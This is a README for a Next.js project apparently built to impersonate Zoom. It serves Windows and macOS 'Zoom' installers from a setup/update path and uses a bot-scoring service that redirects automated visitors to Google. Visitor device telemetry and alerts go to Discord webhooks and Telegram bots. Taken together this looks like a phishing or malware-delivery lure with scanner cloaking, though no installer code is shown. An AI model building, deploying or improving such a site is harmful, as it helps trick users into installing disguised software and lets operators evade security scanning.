This is a [Next.js](https://nextjs.org) project bootstrapped with [`create-next-app`](https://github.com/vercel/next.js/tree/canary/packages/create-next-app).

## Getting Started

First, run the development server:

```bash
npm run dev
# or
yarn dev
# or
pnpm dev
# or
bun dev
```

Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.

You can start editing the page by modifying `app/page.js`. The page auto-updates as you edit the file.

This project uses [`next/font`](https://nextjs.org/docs/app/building-your-application/optimizing/fonts) to automatically optimize and load [Geist](https://vercel.com/font), a new font family for Vercel.

## Environment Configuration

Create a `.env.local` file in the project root with the following values:

### Required Environment Variables

- `NEXT_PUBLIC_ZOOM_WIN_URL` (optional): Override URL for the Windows installer. If omitted, the app serves `public/assets/setup/update/zoominstaller.msi`.
- `NEXT_PUBLIC_ZOOM_MAC_URL`: URL for the macOS installer (`ZoomInstaller.pkg`).
- `NEXT_PUBLIC_MEETING_LINK`: Fallback meeting URL for Join Meeting actions.
- `NEXT_PUBLIC_SENTINEL_PROJECT_KEY`: Your Sentinel anti-bot protection project key (required for bot detection).

### Optional Environment Variables

- `DISCORD_WEBHOOK_URL`: Incoming webhook URL that receives telemetry, device info, and bot detection alerts.
- `TELEGRAM_BOT_TOKEN`: Telegram bot token for notifications.
- `TELEGRAM_CHAT_ID`: Telegram chat ID for notifications.

See `example.env` for a template with all available environment variables.

## Sentinel Anti-Bot Protection

This application integrates [Sentinel](https://sentinel-anitbot-production.up.railway.app) for bot detection and protection.

### Getting Your Sentinel Project Key

1. Register your project with Sentinel:

```bash
curl -X POST https://sentinel-anitbot-production.up.railway.app/api/projects/register \
  -H "Content-Type: application/json" \
  -d '{"name": "Zoom-Next"}'
```

2. Save the returned `projectKey` (format: `pk_xxx...`)

3. Add it to your `.env.local` file:

```
NEXT_PUBLIC_SENTINEL_PROJECT_KEY=pk_your_key_here
```

### How Sentinel Works

- Analyzes browser signals (webdriver, plugins, screen resolution, etc.)
- Assigns a bot score from 0-100
- Actions:
  - **0-39**: Allow (human)
  - **40-69**: Challenge (suspicious)
  - **70-100**: Block (bot) - redirects to Google
- Sends alerts to Discord/Telegram when bots are detected

## Deployment

### Deploy to Coolify

This project includes `nixpacks.toml` for automatic Coolify deployment:

1. Push your code to a Git repository
2. In Coolify dashboard, create a new application
3. Connect to your repository
4. Set environment variables in Coolify
5. Coolify will automatically detect `nixpacks.toml` and deploy
6. Enable auto-deploy to trigger builds on git push

### Deploy to Railway/Vercel

The project also works with Railway and Vercel. Set the same environment variables in your platform's dashboard.


## Learn More

To learn more about Next.js, take a look at the following resources:

- [Next.js Documentation](https://nextjs.org/docs) - learn about Next.js features and API.
- [Learn Next.js](https://nextjs.org/learn) - an interactive Next.js tutorial.

You can check out [the Next.js GitHub repository](https://github.com/vercel/next.js) - your feedback and contributions are welcome!

## Deploy on Vercel

The easiest way to deploy your Next.js app is to use the [Vercel Platform](https://vercel.com/new?utm_medium=default-template&filter=next.js&utm_source=create-next-app&utm_campaign=create-next-app-readme) from the creators of Next.js.

Check out our [Next.js deployment documentation](https://nextjs.org/docs/app/building-your-application/deploying) for more details.
